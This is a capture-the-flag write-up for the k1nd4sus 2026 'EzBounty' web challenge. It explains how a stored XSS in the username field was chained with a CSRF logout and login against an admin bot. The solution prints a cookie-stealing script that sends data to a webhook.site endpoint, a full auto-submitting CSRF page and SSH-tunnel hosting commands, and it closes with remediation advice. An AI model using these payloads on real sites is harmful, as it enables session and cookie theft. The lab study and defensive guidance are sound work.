# k1nd4sus 2026

# EzBounty.md

## Web: XSS, CSRF

## Description
I found a bug on this platform and reported it on HackerOne but they told me it was out of scope. Could you help me get my money?

Note: This challenge is solvable only with Chromium-based browsers. It is recommended to test your payloads on Chrome.

https://chall.k1nd4sus.it:30510

## Files
> This challenge provides the source code of the web application.

---

## Analysis

The app is straightforward: you log in with any username and get a dashboard. No initial screenshots needed — the interesting part is that the username field is **not sanitized**, meaning input like:

```
<script>alert(1)</script>
```

...renders and executes directly — confirmed XSS.

There's also a **report URL** button that makes the admin bot visit any URL. However, simply sending a cookie-stealing payload from an external URL won't work directly, because **SOP (Same-Origin Policy)** prevents a cross-origin page from reading responses from a different origin.

The key insight comes from the bot's source code: after logging in as admin, the bot sets an **additional cookie on the same domain**:

```python
await page.setCookie({
    "name": "flag",
    "value": FLAG,
    "httpOnly": False,
    "sameSite": "None",
    "secure": True
})
```

`httpOnly: False` means `document.cookie` can read it. `sameSite: None` means the cookie is sent in cross-site requests. This opens the door for a **CSRF + XSS chain**.

---

## Theory

To solve this challenge, you need to understand:

- **Stored XSS**: User input (the username) is stored and rendered unsanitized in the dashboard, executing arbitrary JavaScript in the victim's browser context.
- **SOP (Same-Origin Policy)**: The browser allows cross-origin *requests* (send), but blocks reading cross-origin *responses* (receive). This is why a naive external redirect won't steal cookies directly.
- **CSRF (Cross-Site Request Forgery)**: Tricking the victim's browser into making authenticated requests (like logging in with attacker credentials) using HTML forms that auto-submit cross-origin, bypassing SOP since we only need to *send*, not read.
- **`SameSite: None` Cookie Attribute**: Allows cookies to be sent in cross-site requests, which is what enables the CSRF login to carry the admin's session context into our payload.
- **Cookie Exfiltration via Fetch**: Using `document.cookie` combined with `fetch()` to exfiltrate cookies to an attacker-controlled endpoint.
- **Tunneling with `localhost.run`**: Exposing a local HTTP server to the internet via SSH reverse tunnel so the bot can reach attacker-hosted payloads.
- **Patience**: Systematically testing and iterating until the full chain lands.

---

## Solution

### Step 1: Confirm XSS via malicious username

Create an account where the username is the JavaScript payload:

```
Username: <script>fetch('https://webhook.site/WEBHOOK_ID?cookie=' + document.cookie)</script>
Password: algo
```

When the dashboard loads, the script executes and sends cookies to the webhook — XSS confirmed.

### Step 2: Build the CSRF + XSS chain

Simply sending the report URL pointing to our malicious account's dashboard won't work — the admin is already logged in under their own session, so our username XSS won't execute in their context.

The attack chain is:

```
Malicious HTML page → Logout admin → Login as attacker account → XSS fires → Cookie exfiltrated
```

The malicious page uses a hidden image to trigger the logout (GET request), then auto-submits a form to log the admin bot into our poisoned account:

```html
<!DOCTYPE html>
<html>
<body>
    <!-- Step 1: Trigger logout via image load (GET request, SOP allows sending) -->
    <img src="https://chall.k1nd4sus.it:30510/logout"
         style="display:none;"
         onload="doLogin()"
         onerror="doLogin()">

    <!-- Step 2: Auto-submit login form with attacker credentials -->
    <form id="login-form" action="https://chall.k1nd4sus.it:30510/login" method="POST">
        <input type="hidden" name="username" id="payload-user" value="">
        <input type="hidden" name="password" value="algo">
    </form>

    <script>
        function doLogin() {
            document.getElementById("payload-user").value =
                "<script>fetch('https://webhook.site/WEBHOOK_ID?cookie=' + document.cookie)<\/script>";
            document.getElementById("login-form").submit();
        }
    </script>
</body>
</html>
```

This works because SOP allows cross-origin form submissions (send) — we don't need to read the response.

### Step 3: Host and tunnel the payload

Serve the HTML file locally:

```bash
python -m http.server 8000
```

Expose it to the internet via SSH tunnel:

```bash
ssh -R 80:localhost:8000 localhost.run
```

This gives a public URL like:

```
https://5fd4579004cbb7.lhr.life
```

### Step 4: Report the URL and wait

Submit the report URL pointing to the malicious page:

```
https://5fd4579004cbb7.lhr.life/XSS_PAGE.html
```

The admin bot visits it, gets logged out, logs into our poisoned account, the XSS fires, and the flag arrives at the webhook:

```
GET https://webhook.site/26ddafae-d26f-40a6-9d00-edfb731e1040?cookie=flag=KSUS{moneyless_iframe_baby};%20session=.eJwtjd...
Location: 🇮🇹 Milan, Lombardia, Italy
Date: 04/18/2026 4:07:39 PM
```

**MACHINE PWNED!** :)

---

## Flag
> **KSUS{moneyless_iframe_baby}**

---

## How to avoid

### 1. **Sanitize all user input on output**
Never render raw user-supplied content as HTML. Use a template engine with auto-escaping or explicitly HTML-encode values before inserting them into the DOM.

```python
from markupsafe import escape
safe_username = escape(username)  # <script> becomes &lt;script&gt;
```

### 2. **Set `SameSite=Strict` on session cookies**
This prevents the browser from sending cookies on cross-site form submissions, breaking the CSRF login chain entirely.

```python
response.set_cookie("session", value, samesite="Strict", httponly=True)
```

### 3. **Add CSRF tokens to login forms**
Even with `SameSite=Lax`, protect state-changing endpoints (including `/login` and `/logout`) with CSRF tokens that an external page can't forge.

### 4. **Set `httpOnly: True` on sensitive cookies**
The flag cookie was readable via `document.cookie` only because `httpOnly` was `False`. Mark all sensitive cookies as `httpOnly` to block JavaScript access even if XSS fires.

### References
- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [OWASP CSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)

---

> **Author:** Jose Antonio Villafaña Montes de Oca
